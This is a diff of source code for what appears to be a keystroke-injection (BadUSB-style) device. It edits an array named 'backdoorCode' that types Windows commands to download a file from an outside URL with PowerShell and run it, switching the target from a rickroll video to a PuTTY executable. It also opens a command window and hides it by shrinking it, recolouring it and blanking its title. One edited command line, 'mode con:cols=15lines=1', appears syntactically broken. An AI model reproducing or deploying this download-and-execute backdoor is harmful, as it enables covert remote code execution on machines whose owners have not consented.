@@ -11,9 +11,9 @@
 
 // This commands will be executed
 const char* backdoorCode[] = {
-  "set u='https://cdn.discordapp.com/attachments/1154635152610299964/1155258532598382744/rick.mp4'",   // Set url variable
-  "set f=%tmp%\\rickroll.mp4",                                                                        // Set filename variable
-  "powershell -c \"Invoke-WebRequest %u% -OutFile '%f%'\" && start \"\" \"%f%\" && exit"             // Download, Execute, Exit
+  "set u='https://the.earth.li/~sgtatham/putty/0.81/w64/putty.exe'",                       // Set url variable
+  "set f=%tmp%\\p.exe",                                                                   // Set filename variable
+  "powershell -c \"Invoke-WebRequest %u% -OutFile '%f%'\"&&start \"\" \"%f%\" && exit" // Download, Execute, Exit
 };
 
 #ifdef USE_ALT_CODES
@@ -106,10 +106,10 @@ void openHiddenCMD() {
   sendLine("cmd");
   // Hide & configure console window
   const char* hiddenCmd[] = {
-    "mode con: cols=15 lines=1", // Resize cmd to minimal
-    "color fe",                 // Change colors
-    "chcp 65001",              // Set UTF8 encoding
-    "title ",                 // Hide title
+    "mode con:cols=15lines=1", // Resize cmd to minimal
+    "color fe",               // Change colors
+    "chcp 65001",            // Set UTF8 encoding
+    "title ",               // Hide title
   };
   // Hide & configure cmd
   int hiddenCmdLength = sizeof(hiddenCmd) / sizeof(hiddenCmd[0]);
